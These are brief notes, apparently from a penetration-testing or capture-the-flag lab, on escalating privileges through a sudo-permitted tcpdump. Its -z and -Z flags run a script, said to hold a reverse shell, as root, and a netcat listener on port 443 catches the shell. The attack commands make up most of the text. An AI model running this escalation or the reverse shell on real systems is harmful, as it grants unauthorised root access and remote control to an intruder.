**Check what I can use with sudo
```shell-session
sudo -l
```

We can use tcpdump, so let's check it out
```shell-session
man tcpdump
```

This shows we can use the -z flag to execute a shell script
```shell-session
sudo tcpdump -ln -i eth0 -w /dev/null -W 1 -G 1 -z /tmp/.test -Z root
```
- .test contains a reverse shell

**Start a listener
```shell-session
nc -lvnp 443
```

